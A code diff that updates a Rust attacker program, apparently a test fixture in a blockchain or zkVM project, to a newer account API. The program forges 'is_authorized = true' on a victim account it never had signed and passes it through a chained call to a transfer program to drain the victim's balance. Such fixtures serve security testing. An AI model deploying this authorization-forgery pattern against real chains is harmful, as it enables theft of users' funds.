@@ -1,7 +1,7 @@
 use lee_core::{
     account::{Account, AccountId, AccountWithMetadata, Data, Nonce},
     program::{
-        AccountPostState, ChainedCall, ProgramId, ProgramInput, ProgramOutput, read_lee_inputs,
+        ChainedCall, ProgramId, ProgramInput, ProgramOutput, read_lee_inputs,
     },
 };
 
@@ -13,7 +13,7 @@ use lee_core::{
 ///   `victim_id_raw`:          raw `[u8; 32]` of the victim `AccountId`
 ///   `victim_balance`:         victim's current balance
 ///   `victim_nonce`:           victim's current nonce (inner `u128`)
-///   `victim_program_owner`:   victim account's `program_owner` field
+///   `victim_slot`:            slot key holding the victim's balance
 ///   `recipient_id_raw`:       raw `[u8; 32]` of the recipient `AccountId`
 ///   `amount`:                 balance to transfer out of the victim.
 type Instruction = (
@@ -40,7 +40,7 @@ fn main() {
                     victim_id_raw,
                     victim_balance,
                     victim_nonce,
-                    victim_program_owner,
+                    victim_slot,
                     recipient_id_raw,
                     amount,
                 ),
@@ -51,33 +51,19 @@ fn main() {
     // Echo own pre_states (attacker's account) unchanged.
     let post_states = pre_states
         .iter()
-        .map(|p| AccountPostState::new(p.account.clone()))
+        .map(|p| p.account.clone())
         .collect();
 
     // Construct victim AccountWithMetadata from primitives, stamping is_authorized=true.
     // Victim has not signed anything — this flag is forged entirely by P1's logic.
     let victim = AccountWithMetadata {
-        account: Account {
-            program_owner: victim_program_owner.into(),
-            balance: victim_balance,
-            data: Data::default(),
-            nonce: Nonce(victim_nonce),
-        },
+        account: Account::single(victim_slot, victim_balance, Data::default(), Nonce(victim_nonce)),
         is_authorized: true,
         account_id: AccountId::new(victim_id_raw),
     };
 
-    // Recipient is already initialized under authenticated_transfer (program_owner =
-    // auth_transfer_id, balance = 0). Using the default account would trigger
-    // Claim::Authorized inside authenticated_transfer, which requires is_authorized=true
-    // on the recipient — a check that would block the transfer.
     let recipient = AccountWithMetadata {
-        account: Account {
-            program_owner: auth_transfer_id.into(),
-            balance: 0,
-            data: Data::default(),
-            nonce: Nonce(0),
-        },
+        account: Account::single(auth_transfer_id, 0, Data::default(), Nonce(0)),
         is_authorized: false,
         account_id: AccountId::new(recipient_id_raw),
     };
@@ -97,7 +83,6 @@ fn main() {
         program_id: p2_id,
         pre_states: vec![victim, recipient],
         instruction_data: p2_instruction,
-        pda_seeds: vec![],
     }])
     .write();
 }
